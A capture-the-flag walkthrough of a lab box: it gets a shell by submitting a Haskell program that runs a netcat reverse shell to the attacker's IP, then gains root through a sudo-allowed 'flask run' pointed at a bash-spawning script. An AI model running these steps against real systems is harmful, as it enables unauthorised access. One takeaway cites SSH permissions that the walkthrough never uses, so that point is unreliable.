On visiting /submit page we can find a submit button. We can submit our haskell code and run arbitrary commands on the server.

Let's create a reverse shell

module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <Your IP> 4444 >/tmp/f"

Uploading this script we get our reverse shell

Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

On checking privileges for user prof we find that he can run /usr/bin/flask run with root privileges.

For exploiting this we need to create a python script for spawning a root shell

#!/usr/bin/python
import os
os.system("/bin/bash")

Set the variable to our newly created file

export FLASK_APP=/home/prof/bash.py

Run sudo /usr/bin/flask run

prof@haskhell:~$ sudo /usr/bin/flask run
root@haskhell:~# ls
app.py  __pycache__  rev.sh  user.txt

Got the root.txt

root@haskhell:/root# cat root.txt 
flag{<secret>}

Key Takeaways:

  • Always check for code execution vulnerabilities in web applications
  • Haskell can be used for reverse shells just like other languages
  • Misconfigured SSH permissions can lead to easy privilege escalation
  • Flask applications with sudo privileges can be dangerous
